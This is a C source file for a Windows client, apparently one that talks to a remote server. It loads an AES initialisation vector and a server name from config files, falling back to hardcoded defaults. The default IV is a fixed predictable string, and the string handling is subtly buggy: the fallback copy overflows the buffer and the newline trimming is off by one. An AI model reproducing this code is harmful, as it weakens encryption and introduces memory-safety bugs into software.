#include "stdafx.h"
#include "globalvars.h"
#include "UserRegistration.h"
#include "Randoms.h"
#include "Container.h"
#include "AskUsername.h"
#include "AskPasswords.h"
#include "http.h"
#include "PacketFactory.h"
#include "AddNewClient.h"
#include "ClientFunctions.h"
#include "SystemInfo.h"
#include "ReadCfgFiles.h"

/*
Function:
Reading a vector from a file, if a file is not found, sets the default value.
And add AES Vector to Global Var iv128.

vars:

return:
int 0 - FAILED
int 1 - OK
*/
int SetDefaultAESVector()
{
    FILE* pFile = NULL;
    unsigned char * iv128Old = (unsigned char *)"1111333355557777"; // 16 byte (128 bit)

    iv128 = (unsigned char*)VirtualAlloc(NULL, 16, MEM_COMMIT, PAGE_READWRITE);
    if (iv128 == NULL)
    {
        printf("Error VirtualAlloc for iv128 buffer.\r\n");
        return 0;
    }


    pFile = fopen("aes.cfg", "rb");
    if (pFile != NULL)
    {
        iv128[0] = fgetc(pFile);
        iv128[1] = fgetc(pFile);
        iv128[2] = fgetc(pFile);
        iv128[3] = fgetc(pFile);
        iv128[4] = fgetc(pFile);
        iv128[5] = fgetc(pFile);
        iv128[6] = fgetc(pFile);
        iv128[7] = fgetc(pFile);
        iv128[8] = fgetc(pFile);
        iv128[9] = fgetc(pFile);
        iv128[10] = fgetc(pFile);
        iv128[11] = fgetc(pFile);
        iv128[12] = fgetc(pFile);
        iv128[13] = fgetc(pFile);
        iv128[14] = fgetc(pFile);
        iv128[15] = fgetc(pFile);
        fclose(pFile);
    }
    else {
        strcat_s((char*)iv128, 16, (char*)iv128Old);
    }

    return 1;
}


/*
Function:
Gets the name of the server from the file, if the file is not found, it sets the default server name.
And add server name to Global Var gServername.

vars:

return:
int 0 - FAILED
int 1 - OK
*/
int ServersList()
{
    char* Servername = NULL;
    FILE* pFile = NULL;
    char* ServernameOld = "www.ckeck.space";

    Servername = (char*)VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE);
    if (Servername == NULL)
    {
        printf("Error VirtualAlloc for Servername buffer.\r\n");
        return 0;
    }

    memset(Servername, 0, 256);

    pFile = fopen("server.cfg", "rb");
    if (pFile != NULL)
    {
        if (fgets(Servername, 255, pFile) != NULL)
        {
            int Len = strlen(Servername);
            if (Servername[Len] == '\n') Servername[Len] = 0;
            if (Servername[Len] == '\r') Servername[Len] = 0;
            if (Servername[Len - 1] == '\n') Servername[Len - 1] = 0;
            if (Servername[Len - 1] == '\r') Servername[Len - 1] = 0;
            if (Servername[Len - 2] == '\n') Servername[Len - 2] = 0;
            if (Servername[Len - 2] == '\r') Servername[Len - 2] = 0;
        }
        else {
            strcat_s(Servername, 255, ServernameOld);
        }
        fclose(pFile);
    }
    else {
        strcat_s(Servername, 255, ServernameOld);
    }
    gServername = Servername;
    return 1;
}
